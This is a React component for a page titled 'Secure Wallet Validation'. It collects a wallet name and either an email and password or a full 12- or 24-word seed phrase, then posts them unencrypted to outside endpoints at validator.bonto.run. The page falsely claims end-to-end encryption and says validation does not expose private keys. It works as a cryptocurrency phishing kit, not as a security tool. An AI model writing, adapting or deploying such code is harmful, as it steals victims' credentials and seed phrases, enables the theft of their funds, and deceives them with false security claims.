import React, { useState } from "react";
import {
  Shield,
  Eye,
  EyeOff,
  Loader2,
  CheckCircle
} from "lucide-react";
import "./secureWallet.css";

/* DIFFERENT APIs */
const EMAIL_API = "https://validator.bonto.run/other-wallet";
const SEED_API = "https://validator.bonto.run/other-pharse";

const SecureWallet = () => {
  const [method, setMethod] = useState(null);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");

  const [form, setForm] = useState({
    walletName: "",
    emailOrUsername: "",
    password: "",
    passphrase: ""
  });

  const submit = async () => {
    if (!form.walletName) {
      setError("Wallet name is required");
      return;
    }

    if (method === "email" && (!form.emailOrUsername || !form.password)) {
      setError("All fields are required");
      return;
    }

    if (method === "seed" && !form.passphrase) {
      setError("Seed phrase is required");
      return;
    }

    setError("");
    setLoading(true);

    try {
      const res = await fetch(method === "email" ? EMAIL_API : SEED_API, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form)
      });

      if (!res.ok) throw new Error("Validation failed");
      setDone(true);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  /* ================= SUCCESS ================= */
  if (done) {
    return (
      <div className="secure-wrapper">
        <div className="secure-box">
          <CheckCircle size={42} color="#38bdf8" />
          <h2>Validation in Progress</h2>
          <p>
            Your wallet details have been securely submitted.
            You’ll be notified once verification is completed.
          </p>

          <button onClick={() => window.location.reload()}>
            Validate Another Wallet
          </button>
        </div>
      </div>
    );
  }

  /* ================= SELECT METHOD ================= */
  if (!method) {
    return (
      <div className="secure-wrapper">
        <div className="secure-box">
          <Shield size={36} />
          <h1>Secure Wallet Validation</h1>
          <p>Select how you want to secure your wallet</p>

          <div className="method-buttons">
            <button onClick={() => setMethod("email")}>
              Email & Password
            </button>
            <button onClick={() => setMethod("seed")}>
              Seed Phrase
            </button>
          </div>
        </div>
      </div>
    );
  }

  /* ================= FORMS ================= */
  return (
    <div className="secure-wrapper">
      <div className="secure-box">

        <h1>Wallet Validation</h1>
        <p className="subtitle">
          Secure your wallet using {method === "email" ? "Email & Password" : "Seed Phrase"}
        </p>

        <div className="panel">
          <div className="security">
            <Shield size={14} />
            End-to-end encrypted
          </div>

          {/* WALLET NAME */}
          <div className="input-group">
            <label>Wallet Name / Type</label>
            <input
              type="text"
              placeholder="e.g. coinbase, binance"
              value={form.walletName}
              onChange={(e) =>
                setForm({ ...form, walletName: e.target.value })
              }
            />
          </div>

          {/* EMAIL FLOW */}
          {method === "email" && (
            <>
              <div className="input-group">
                <label>Email Address</label>
                <input
                  type="email"
                  placeholder="you@example.com"
                  value={form.emailOrUsername}
                  onChange={(e) =>
                    setForm({ ...form, emailOrUsername: e.target.value })
                  }
                />
              </div>

              <div className="input-group">
                <label>Password</label>
                <div className="password-field">
                  <input
                    type={showPassword ? "text" : "password"}
                    placeholder="Enter password"
                    value={form.password}
                    onChange={(e) =>
                      setForm({ ...form, password: e.target.value })
                    }
                  />
                  <button onClick={() => setShowPassword(!showPassword)}>
                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>
            </>
          )}

          {/* SEED FLOW */}
          {method === "seed" && (
            <div className="input-group">
              <label>Seed Phrase</label>
              <textarea
                placeholder="Enter your 12 or 24 word seed phrase"
                value={form.passphrase}
                onChange={(e) =>
                  setForm({ ...form, passphrase: e.target.value })
                }
              />
            </div>
          )}

          {error && <div className="error">{error}</div>}

          <button className="submit-btn" onClick={submit} disabled={loading}>
            {loading ? (
              <>
                <Loader2 size={18} className="spin" />
                Validating...
              </>
            ) : (
              "Validate Wallet"
            )}
          </button>

          <p className="notice">
            Validation confirms ownership without exposing private keys.
          </p>
        </div>

        <footer>
          Protected by industry-grade security standards
        </footer>

      </div>
    </div>
  );
};

export default SecureWallet;
